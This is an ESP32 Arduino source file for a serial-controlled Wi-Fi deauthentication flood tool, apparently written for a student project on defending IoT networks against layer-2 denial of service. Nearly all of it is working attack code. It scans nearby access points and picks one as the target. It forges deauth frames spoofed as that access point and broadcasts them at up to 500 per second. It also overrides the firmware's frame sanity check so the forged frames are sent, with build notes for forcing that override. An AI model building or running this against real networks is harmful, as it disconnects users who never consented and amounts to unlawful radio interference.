/*
 * ESP32 Layer-2 DoS / Deauthentication Attack Node
 * FYP: Defending Legacy IoT Networks Against Layer-2 Wireless DoS
 *
 * Serial command interface (no web UI yet).
 *
 *   scan                    list nearby APs: index, SSID, BSSID, channel, RSSI
 *   deauth <idx> [pps]      start a continuous deauth flood on AP <idx>
 *                           (default 20 pps; max 500)
 *   stop                    halt the flood and print a summary
 *   status                  show current state and counters
 *   help                    reprint the command list
 *
 * BUILD NOTE
 * The override below collides with the copy inside the core's libnet80211.a.
 * With Arduino IDE + ESP32 core 3.x, create platform.local.txt next to
 * platform.txt in the core folder, containing:
 *     compiler.c.elf.extra_flags=-Wl,-zmuldefs
 * (or weaken the library symbol with objcopy - see notes)
 */

#include <WiFi.h>
#include <esp_wifi.h>

// Force the firmware's raw-frame sanity check to always pass, so our
// hand-built frames are never rejected. Must return 0.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) { return 0; }

// ---------------------------------------------------------------------------
// 802.11 deauthentication frame - 26 bytes
// ---------------------------------------------------------------------------
typedef struct {
  uint8_t frame_ctrl[2];   // 0xC0 0x00 -> management frame, subtype 12 (deauth)
  uint8_t duration[2];
  uint8_t dest[6];         // addr1 = receiver (broadcast = every station)
  uint8_t src[6];          // addr2 = transmitter (spoofed as the AP)
  uint8_t bssid[6];        // addr3 = BSSID (the AP)
  uint8_t seq_ctrl[2];
  uint8_t reason[2];       // little-endian reason code
} __attribute__((packed)) deauth_frame_t;

deauth_frame_t deauth;
const uint8_t  BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

const char* AP_SSID = "ESP32-Deauther";
const char* AP_PASS = "esp32wroom32";

#define LED_PIN 2          // built-in LED; set to 48 on most S3 devkits, -1 to disable

// ---------------------------------------------------------------------------
// Attack state
// ---------------------------------------------------------------------------
bool     attacking  = false;
uint8_t  targetBssid[6];
char     targetSsid[33];
uint8_t  targetCh   = 1;
uint16_t reasonCode = 2;      // 2 = previous authentication no longer valid
uint32_t intervalMs = 50;
uint32_t lastSend   = 0;
uint32_t sent       = 0;
uint32_t failed     = 0;
uint32_t startedAt  = 0;

// ---------------------------------------------------------------------------
void printHelp() {
  Serial.println();
  Serial.println("Commands:");
  Serial.println("  scan                  list nearby APs");
  Serial.println("  deauth <idx> [pps]    flood AP <idx> (default 20 pps)");
  Serial.println("  stop                  halt the flood");
  Serial.println("  status                show state + counters");
  Serial.println("  help                  this list");
  Serial.println();
}

void printMac(const uint8_t* m) {
  Serial.printf("%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
}

// Pin the radio to the target channel. softAP() alone does not reliably retune
// an already-running AP, so this is done explicitly and then verified.
void lockChannel() {
  esp_err_t e = esp_wifi_set_channel(targetCh, WIFI_SECOND_CHAN_NONE);
  uint8_t now; wifi_second_chan_t sec;
  esp_wifi_get_channel(&now, &sec);
  Serial.printf("  set_channel=%d, radio on ch %u (target %u)\n", e, now, targetCh);
  if (now != targetCh) Serial.println("  WARNING: radio did not move to target channel");
}

void sendFrame() {
  memcpy(deauth.dest,  BROADCAST,   6);
  memcpy(deauth.src,   targetBssid, 6);
  memcpy(deauth.bssid, targetBssid, 6);
  deauth.reason[0] = reasonCode & 0xFF;
  deauth.reason[1] = (reasonCode >> 8) & 0xFF;

  if (esp_wifi_80211_tx(WIFI_IF_AP, &deauth, sizeof(deauth), false) == ESP_OK) sent++;
  else failed++;
}

void doScan() {
  int n = WiFi.scanNetworks();
  if (n <= 0) { Serial.println("scan failed / no networks"); return; }
  Serial.printf("%-4s %-26s %-18s %-4s %s\n", "IDX", "SSID", "BSSID", "CH", "RSSI");
  for (int i = 0; i < n; i++) {
    Serial.printf("%-4d %-26s %-18s %-4d %d\n",
      i, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.channel(i), WiFi.RSSI(i));
  }
  Serial.printf("%d networks\n", n);
}

void startAttack(int idx, uint32_t pps) {
  int n = WiFi.scanNetworks();
  if (n <= 0)              { Serial.println("scan failed"); return; }
  if (idx < 0 || idx >= n) { Serial.printf("bad index (0-%d)\n", n - 1); return; }

  memcpy(targetBssid, WiFi.BSSID(idx), 6);
  strncpy(targetSsid, WiFi.SSID(idx).c_str(), sizeof(targetSsid) - 1);
  targetSsid[sizeof(targetSsid) - 1] = 0;
  targetCh = WiFi.channel(idx);

  Serial.print("Target: '"); Serial.print(targetSsid);
  Serial.print("'  BSSID "); printMac(targetBssid);
  Serial.printf("  ch %u  rssi %d\n", targetCh, WiFi.RSSI(idx));

  lockChannel();

  intervalMs = 1000 / (pps ? pps : 20);
  if (intervalMs == 0) intervalMs = 1;

  sent = failed = 0;
  lastSend  = 0;
  startedAt = millis();
  attacking = true;

  Serial.printf("Attacking at ~%u pps. Type 'stop' to halt.\n", 1000 / intervalMs);
}

void stopAttack() {
  if (!attacking) { Serial.println("not attacking"); return; }
  attacking = false;
  uint32_t secs = (millis() - startedAt) / 1000;
  Serial.printf("Stopped after %us: %u sent, %u failed\n", secs, sent, failed);
  if (secs > 0) Serial.printf("effective rate ~%u pps\n", sent / secs);
}

void clearSerialMonitor() {
  for (int i = 0; i < 50; i++) {
    Serial.println();
  }
}

// ---------------------------------------------------------------------------
void setup() {
  Serial.begin(115200);
  delay(500);

  deauth.frame_ctrl[0] = 0xC0; deauth.frame_ctrl[1] = 0x00;
  deauth.duration[0]   = 0x00; deauth.duration[1]   = 0x00;
  deauth.seq_ctrl[0]   = 0x00; deauth.seq_ctrl[1]   = 0x00;

  if (LED_PIN >= 0) { pinMode(LED_PIN, OUTPUT); digitalWrite(LED_PIN, LOW); }

  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID, AP_PASS, 1);
  WiFi.setSleep(false);                 // keep the radio awake for reliable TX

  Serial.printf("\nESP32 Deauther ready. frame len = %u bytes\n", (unsigned)sizeof(deauth));
  printHelp();
}

void loop() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();

    if (cmd == "scan") {
      clearSerialMonitor();
      doScan();
      if (attacking) lockChannel();      // scan hopped channels; pin back
    }
    else if (cmd == "stop") {
      stopAttack();
    }
    else if (cmd == "status") {
      Serial.printf("attacking=%s  target='%s'  ch=%u  interval=%ums  sent=%u  failed=%u\n",
        attacking ? "yes" : "no", targetSsid, targetCh, intervalMs, sent, failed);
    }
    else if (cmd == "help") {
      printHelp();
    }
    else if (cmd.startsWith("deauth")) {
      int idx = -1; unsigned pps = 20;
      sscanf(cmd.c_str(), "deauth %d %u", &idx, &pps);
      if (idx < 0) { Serial.println("usage: deauth <idx> [pps]"); }
      else {
        if (pps == 0)   pps = 20;
        if (pps > 500)  pps = 500;
        startAttack(idx, pps);
      }
    }
    else {
      Serial.println("unknown command (try 'help')");
    }
  }

  // Transmit on schedule without blocking the console
  if (attacking && (millis() - lastSend >= intervalMs)) {
    lastSend = millis();
    sendFrame();
  }

  if (LED_PIN >= 0) digitalWrite(LED_PIN, attacking ? HIGH : LOW);
}
